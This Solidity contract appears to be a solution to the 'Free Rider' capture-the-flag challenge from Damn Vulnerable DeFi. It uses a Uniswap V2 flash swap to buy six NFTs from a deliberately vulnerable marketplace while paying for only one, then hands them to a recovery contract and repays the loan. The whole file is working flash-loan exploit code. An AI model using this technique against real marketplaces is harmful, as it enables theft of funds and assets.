// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "../free-rider/FreeRiderNFTMarketplace.sol";
import "../free-rider/FreeRiderRecovery.sol";
import "solmate/src/tokens/WETH.sol";
import "../DamnValuableNFT.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external;
}

contract attackTimeFree is IUniswapV2Callee
{

    WETH weth;
    address owner;
    IUniswapV2Factory  factory;
    IUniswapV2Pair pair;
    FreeRiderNFTMarketplace market;
    IERC20 token;

    uint public amountToRepay;
    FreeRiderRecovery recovery;

    DamnValuableNFT public nft;  

    constructor(address payable _weth, IUniswapV2Factory  _uniswapF, address tokenA, address payable _market, address _recovery)
    {

        owner = msg.sender;

        weth = WETH(_weth);        
        factory = _uniswapF;
        pair = IUniswapV2Pair(factory.getPair(tokenA, address(weth)));
        console.log("Pair address is ", address(pair));
        token = IERC20(tokenA);
        market = FreeRiderNFTMarketplace(_market);

        recovery = FreeRiderRecovery(_recovery);

        nft = market.token();
        nft.setApprovalForAll(address(recovery), true);

    }

    function flashSwap(uint wethAmount) external {
        // Need to pass some data to trigger uniswapV2Call
        bytes memory data = abi.encode(weth, msg.sender);

        // amount0Out is DAI, amount1Out is WETH
        pair.swap(wethAmount, 0, address(this), data);
    }

    uint256 constant NFT_PRICE = 15 ether;
    uint256[] asper = [0,1,2,3,4,5];
    // This function is called by the DAI/WETH pair contract
    function uniswapV2Call(
        address sender,
        uint ,
        uint amount1,
        bytes calldata data
    ) external {
        require(msg.sender == address(pair), "not pair");
        require(sender == address(this), "not sender");

        console.log("\nuniswap pair token : ", token.balanceOf(address(pair)));
        console.log("uniswap pair weth : ", weth.balanceOf(address(pair)), "\n" );
        

        (address tokenBorrow, address caller) = abi.decode(data, (address, address));

        // Your custom code would go here. For example, code to arbitrage.
        require(tokenBorrow == address(weth), "token borrow != WETH");

        //CUSTOM CODE START

        //check wei balance
        console.log("WETH contract BALANCE IS ",weth.balanceOf(address(this)));
        console.log("TOKEN contract BALANCE IS ",token.balanceOf(address(this)));
        // buy all nfts (6*15 ether = 75 ether)
        // buyMany

        uint amount = weth.balanceOf(address(this));

        weth.withdraw(amount);

        console.log("contract balance before buyMany ", address(this).balance);

        market.buyMany{value: NFT_PRICE}( asper );
        
        console.log("contract balance after buyMany ", address(this).balance);
        console.log("amount 1 is ",amount);

        //CUSTOM CODE END
        sendToDev();
        // about 0.3% fee, +1 to round up
        uint fee = ((amount * 3) / 1000) + 1;
        amountToRepay = amount + fee + 1 ether    ;
        //free
        weth.deposit{value: amountToRepay}();
        // Repay
        weth.transfer(address(pair), amountToRepay);



        console.log("\nuniswap pair token : ", token.balanceOf(address(pair)));
        console.log("uniswap pair weth : ", weth.balanceOf(address(pair)), "\n" );
        console.log("owner is ",owner);
        console.log("amount i have is ",address(this).balance );        
        unicheck(0, amount);
        // selfdestruct(payable(owner));
    }

    function unicheck(uint amount0Out, uint amount1Out) public
    {        
        (uint112 _reserve0, uint112 _reserve1,) = pair.getReserves(); // gas savings       
        uint balance0;
        uint balance1;
        { // scope for _token{0,1}, avoids stack too deep errors
        address _token0 = address(weth);
        address _token1 = address(token);
        
        balance0 = IERC20(_token0).balanceOf(address(pair));
        balance1 = IERC20(_token1).balanceOf(address(pair));
        }
        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;
        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;
        require(amount0In > 0 || amount1In > 0, 'UniswapV2: INSUFFICIENT_INPUT_AMOUNT');
        { // scope for reserve{0,1}Adjusted, avoids stack too deep errors
        uint balance0Adjusted = balance0*(1000) - (amount0In*(3));
        uint balance1Adjusted = balance1*(1000) - (amount1In*(3));
        console.log("\nLHS : ",balance0Adjusted*(balance1Adjusted));
        console.log("\nRHS : ",uint(_reserve0)*(_reserve1)*(1000**2), "\n");

        uint x = balance0Adjusted*(balance1Adjusted);
        uint u = uint(_reserve0)*(_reserve1)*(1000**2);

        console.log(x>=u);
    }

    }

    error CallerNotNFT();
    function onERC721Received(address, address, uint256 _tokenId, bytes memory )
        external                
        returns (bytes4)
    {
        if (msg.sender != address(nft))
            revert CallerNotNFT();
        

        return attackTimeFree.onERC721Received.selector;
        
    }

    function sendToDev() public
    {
        for(uint tokenId = 0; tokenId< 6; tokenId++)
        nft.safeTransferFrom(address(this), address(recovery), tokenId, abi.encode(owner));
    }

    receive() external payable{} 
    fallback() external payable{}
    
}


interface IUniswapV2Pair {
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;

    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast); 
}

interface IUniswapV2Factory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint);

    function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

interface IWETH is IERC20 {
    function deposit() external payable;

    function withdraw(uint amount) external;
}